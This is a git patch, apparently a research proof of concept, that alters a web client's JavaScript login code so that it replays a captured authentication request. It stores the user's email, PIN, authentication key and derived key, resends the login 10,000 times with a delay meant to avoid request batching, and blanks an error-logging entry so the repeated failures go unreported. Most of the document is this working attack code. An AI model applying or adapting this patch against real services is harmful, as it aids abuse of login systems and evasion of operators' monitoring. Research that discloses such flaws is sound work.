@@ -1,0 +1,156 @@
+From cdbeedc3a5b1e778df47601ef1a7bc8cd8c0843a Mon Sep 17 00:00:00 2001
+From: Anonymous <>
+Date: Fri, 19 Aug 2022 16:09:11 +0100
+Subject: [PATCH] Minimal changes to allow repeated login attempts
+
+---
+ js/account.js  |  6 ++++
+ js/security.js | 83 +++++++++++++++++++++++++++++++-------------------
+ 2 files changed, 57 insertions(+), 32 deletions(-)
+
+diff --git a/js/account.js b/js/account.js
+index 3e8a7f0c3..edadefca2 100644
+--- a/js/account.js
++++ b/js/account.js
+@@ -272,6 +272,12 @@ async function u_checklogin4(sid) {
+     // let's use M.req()'s deduplication capability in case of concurrent callers..
+     const ug = await Promise.resolve(M.req('ug')).catch(echo);
+ 
++    // PoC: loop back to login by using the same credentials
++    // note that this is only necessary for one of the disambiguation strategies which relies on completing authentication
++    u_storage.sid = u_sid = undefined;
++    security.login.sendAuthenticationKey(security.pocEmail, security.pocPinCode, security.pocAuthenticationKeyBase64, security.pocDerivedEncryptionKeyArray32);
++    throw new SecurityError('Invalid Session!');
++
+     const res = await promisify(resolve => {
+         u_checklogin3a(ug, {
+             checkloginresult: (ctx, r) => resolve(r)
+diff --git a/js/security.js b/js/security.js
+index 9aa705621..833be8eba 100644
+--- a/js/security.js
++++ b/js/security.js
+@@ -4,6 +4,12 @@
+  */
+ var security = {
+ 
++    // PoC: saved data for repeated login requests
++    pocEmail: null,
++    pocPinCode: null,
++    pocAuthenticationKeyBase64: null,
++    pocDerivedEncryptionKeyArray32: null,
++
+     /** Minimum password length across the app for registration and password changes */
+     minPasswordLength: 8,
+ 
+@@ -1128,6 +1134,12 @@ security.login = {
+             // Convert the Derived Encryption Key to a big endian array of 32 bit values for decrypting the Master Key
+             var derivedEncryptionKeyArray32 = base64_to_a32(ab_to_base64(derivedEncryptionKeyBytes));
+ 
++            // PoC: save the authentication request values
++            security.pocEmail = email;
++            security.pocPinCode = pinCode;
++            security.pocAuthenticationKeyBase64 = authenticationKeyBase64;
++            security.pocDerivedEncryptionKeyArray32 = derivedEncryptionKeyArray32;
++
+             // Authenticate with the API
+             security.login.sendAuthenticationKey(email, pinCode, authenticationKeyBase64, derivedEncryptionKeyArray32);
+         });
+@@ -1141,7 +1153,7 @@ security.login = {
+      * @param {Array} derivedEncryptionKeyArray32 A 128 bit key encoded as a big endian array of 32 bit values which
+      *                                            was used to encrypt the Master Key
+      */
+-    sendAuthenticationKey: function(email, pinCode, authenticationKeyBase64, derivedEncryptionKeyArray32) {
++    sendAuthenticationKey: async function(email, pinCode, authenticationKeyBase64, derivedEncryptionKeyArray32) {
+ 
+         'use strict';
+ 
+@@ -1159,41 +1171,46 @@ security.login = {
+             requestVars.mfa = pinCode;
+         }
+ 
+-        // Send the Email and Authentication Key to the API
+-        api_req(requestVars, {
+-            callback: function(result) {
+-
+-                // If successful
+-                if (typeof result === 'object') {
+-
+-                    // Get values from Object
+-                    var temporarySessionIdBase64 = result.tsid;
+-                    var encryptedSessionIdBase64 = result.csid;
+-                    var encryptedMasterKeyBase64 = result.k;
+-                    var encryptedPrivateRsaKey = result.privk;
+-                    var userHandle = result.u;
+-
+-                    // Decrypt the Master Key
+-                    var encryptedMasterKeyArray32 = base64_to_a32(encryptedMasterKeyBase64);
+-                    var cipherObject = new sjcl.cipher.aes(derivedEncryptionKeyArray32);
+-                    var decryptedMasterKeyArray32 = decrypt_key(cipherObject, encryptedMasterKeyArray32);
+-
+-                    // If the temporary session ID is set then we need to generate RSA keys
+-                    if (typeof temporarySessionIdBase64 !== 'undefined') {
+-                        security.login.skipToGenerateRsaKeys(decryptedMasterKeyArray32, temporarySessionIdBase64);
++        // PoC: repeat login attempts
++        var repeat = 10000;
++        for (var i = 0; i < repeat; i++) {
++            await sleep(0.3);  // PoC: try to avoid batching of requests
++            // Send the Email and Authentication Key to the API
++            api_req(requestVars, {
++                callback: function(result) {
++
++                    // If successful
++                    if (typeof result === 'object') {
++
++                        // Get values from Object
++                        var temporarySessionIdBase64 = result.tsid;
++                        var encryptedSessionIdBase64 = result.csid;
++                        var encryptedMasterKeyBase64 = result.k;
++                        var encryptedPrivateRsaKey = result.privk;
++                        var userHandle = result.u;
++
++                        // Decrypt the Master Key
++                        var encryptedMasterKeyArray32 = base64_to_a32(encryptedMasterKeyBase64);
++                        var cipherObject = new sjcl.cipher.aes(derivedEncryptionKeyArray32);
++                        var decryptedMasterKeyArray32 = decrypt_key(cipherObject, encryptedMasterKeyArray32);
++
++                        // If the temporary session ID is set then we need to generate RSA keys
++                        if (typeof temporarySessionIdBase64 !== 'undefined') {
++                            security.login.skipToGenerateRsaKeys(decryptedMasterKeyArray32, temporarySessionIdBase64);
++                        }
++                        else {
++                            // Otherwise continue a regular login
++                            security.login.decryptRsaKeyAndSessionId(decryptedMasterKeyArray32, encryptedSessionIdBase64,
++                                                                    encryptedPrivateRsaKey, userHandle);
++                        }
+                     }
+                     else {
+-                        // Otherwise continue a regular login
+-                        security.login.decryptRsaKeyAndSessionId(decryptedMasterKeyArray32, encryptedSessionIdBase64,
+-                                                                 encryptedPrivateRsaKey, userHandle);
++                        // Return failure
++                        security.login.loginCompleteCallback(result);
+                     }
+                 }
+-                else {
+-                    // Return failure
+-                    security.login.loginCompleteCallback(result);
+-                }
+-            }
+-        });
++            });
++        }
+     },
+ 
+     /**
+@@ -1297,6 +1314,8 @@ security.login = {
+             keyAndSessionData = [masterKeyArray32, decryptedSessionIdBase64, decodedPrivateRsaKey];
+         }
+         catch (ex) {
++            // PoC: due to repeated login attempts, errors that would normally be sent would be silenced
++            eventlog.sent['99752'] = null;
+             if (!eventlog.sent['99752']) {
+                 eventlog(99752, JSON.stringify([1, 12, userHandle, errobj, String(ex).split('\n')[0]]));
+             }
+-- 
+2.31.0
+
